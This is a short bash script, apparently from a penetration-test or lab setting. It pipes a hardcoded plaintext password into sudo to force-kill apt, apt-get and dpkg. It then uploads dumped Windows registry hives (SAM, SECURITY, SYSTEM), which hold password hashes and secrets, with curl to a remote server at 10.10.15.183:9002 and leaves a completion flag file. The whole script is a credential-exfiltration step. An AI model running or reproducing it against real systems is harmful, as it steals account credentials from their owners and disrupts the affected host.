#!/bin/bash
echo 'opc0932k90%%lODFI93-++' | sudo -S pkill -9 apt-get
echo 'opc0932k90%%lODFI93-++' | sudo -S pkill -9 apt
echo 'opc0932k90%%lODFI93-++' | sudo -S pkill -9 dpkg
curl -T /tmp/hives/sam.save http://10.10.15.183:9002/sam.save
curl -T /tmp/hives/security.save http://10.10.15.183:9002/security.save
curl -T /tmp/hives/system.save http://10.10.15.183:9002/system.save
echo DONE >/tmp/push_hives.flag
